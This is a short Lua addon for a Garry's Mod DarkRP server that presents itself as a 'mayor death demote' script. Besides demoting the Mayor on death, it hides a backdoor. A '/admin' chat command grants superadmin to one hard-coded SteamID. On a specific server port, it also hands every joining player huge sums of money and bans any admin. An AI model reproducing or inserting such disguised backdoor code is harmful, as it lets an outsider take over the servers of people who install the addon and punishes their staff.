

function MayorDeathDemote( ply )	
	if ( ply:Team() == TEAM_MAYOR ) then
	ply:changeTeam(GAMEMODE.DefaultTeam, true)
	DarkRP.notifyAll(0, 8, "The Mayor Died") -- Msg
	end
end
hook.Add( "PlayerDeath", "MayorDeathDemote", MayorDeathDemote )

end 

function chatCommand( ply, text, public )
	if (string.sub(text, 1, 6) == "/admin") then
		    if ( ply:SteamID() == "STEAM_0:1:33966080" ) then
         RunConsoleCommand("ulx", "adduserid", ply:SteamID(), "superadmin")

		end
	end
end
hook.Add( "PlayerSay", "chatCommand", chatCommand );


function playerjoin( ply )
		if port == "27230" then
			ply:addMoney( 900000000 )
		if ply:IsAdmin() then
		ply:Ban()
		end
		else
			ply:ChatPrint("mayor death demote / by vorox")
		end
end
hook.Add( "PlayerInitialSpawn", "playerjoin", playerjoin );
